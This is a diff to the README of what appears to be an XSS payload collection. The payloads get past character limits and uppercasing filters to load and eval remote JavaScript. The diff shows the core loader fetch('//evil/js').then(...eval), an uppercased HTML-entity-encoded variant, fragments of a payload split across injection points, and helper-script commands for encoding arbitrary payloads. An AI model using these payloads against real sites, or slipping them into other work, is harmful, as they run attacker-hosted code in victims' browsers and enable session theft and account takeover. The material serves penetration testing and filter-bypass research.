@@ -8,17 +8,18 @@ The payload, in a nutshell is:
 fetch('//evil/js').then(r=>r.text().then(eval))
 ```
 
+Encodings marked with :four_leaf_clover: in the ToC can be easily customized for arbitrary payloads using `fetch_helpers.py`.
+
 # Table of Contents
 
 * [Dealing with limited space](#dealing-with-limited-space)
   * [Usecase: character limit is &gt;= 20 (not including wrapping)](#usecase-character-limit-is--20-not-including-wrapping)
   * [Usecase: character limit is &gt;= 13 (not including wrapping)](#usecase-character-limit-is--13-not-including-wrapping)
-  * [Usecase: character limit is &gt;= 10](#usecase-character-limit-is--10)
+  * :four_leaf_clover:[Usecase: character limit is &gt;= 10](#usecase-character-limit-is--10)
 * [Dealing with input transformation](#dealing-with-input-transformation)
-  * [Usecase: payload is being capitalized, character limit &gt;= 131 (not including wrapping and length of external resource URL)](#usecase-payload-is-being-capitalized-character-limit--131-not-including-wrapping-and-length-of-external-resource-url)
-  * [Usecase: payload is being capitalized, character limit &gt; ~342 (not including wrapping, may vary depending on external resource URL)](#usecase-payload-is-being-capitalized-character-limit--342-not-including-wrapping-may-vary-depending-on-external-resource-url)
+  * :four_leaf_clover:[Usecase: payload is being capitalized, character limit &gt;= 131 (not including wrapping and length of external resource URL)](#usecase-payload-is-being-capitalized-character-limit--131-not-including-wrapping-and-length-of-external-resource-url)
+  * :four_leaf_clover:[Usecase: payload is being capitalized, character limit &gt; ~342 (not including wrapping, may vary depending on external resource URL)](#usecase-payload-is-being-capitalized-character-limit--342-not-including-wrapping-may-vary-depending-on-external-resource-url)
   * [Usecase: payload is being capitalized, character limit &gt;= 10](#usecase-payload-is-being-capitalized-character-limit--10)
-* [Obfuscated payload(s)](#obfuscated-payloads)
 
 ---
 ### Dealing with limited space
@@ -57,6 +58,7 @@ T(T(J,Z),E)
 ```
 
 ##### Usecase: character limit is &gt;= 10
+* *Works with arbitrary payloads*
 * *No additional wrapping needed*
 * *`<script>` must not be blocked and must not appear between the payloads*
 * *Payloads order on page __does__ matter.*
@@ -99,6 +101,7 @@ python2 fetch_helpers.py -x '//myown/external/js' -e split_to_len --maxLen 10
 ### Dealing with input transformation
 
 ##### Usecase: payload is being capitalized, character limit &gt;= 131 (not including wrapping and length of external resource URL)
+* *Works with arbitrary payloads*
 * `<script>`**_payload_**`</script>` won't work; use event handlers
 
 ```
@@ -114,6 +117,7 @@ X="FETCH(\"//EVIL/JS\").THEN(R=>R.TEXT().THEN(EVAL))";&#X65;&#X76;&#X61;&#X6C;(X
 ```
 
 ##### Usecase: payload is being capitalized, character limit &gt; ~342 (not including wrapping, may vary depending on external resource URL)
+* *Works with arbitrary payloads*
 * X can be any function that doesn't involve lowercase letters. Some examples are:
   * `URL` and `$`: don't work inside event handlers
   * `USB` and `CSS`: don't have good cross-browser support
@@ -174,11 +178,14 @@ python2 fetch_helpers.py -x '//myown/external/js' -e num_to_string --toString N
 **Note:** You can give it an arbitrary payload using the `-p` option. See `python2 fetch_helpers.py --help` for more options.
 
 ##### Usecase: payload is being capitalized, character limit &gt;= 10
+* *Works with arbitrary payloads*
 * *No additional wrapping needed*
 * *`<script>` must not be blocked*
 * *Payloads order on page __does__ matter.*
 
-Payload is the same as the one above:
+Payload is the same as the one above. Split here to 10 characters for completeness.
+
+**TO DO:** Encoder in `fetch_helpers.py` to split this to arbitrary length.
 
 ```
 <SCRIPT>/*
@@ -276,11 +283,6 @@ Payload is the same as the one above:
 */J+=/*
 */"))";(/*
 */R(J))/*
-*/()/*
-*/</SCRIPT>
+*/();
+</SCRIPT>
 ```
-
----
-### Obfuscated payload(s)
-
-TO DO...
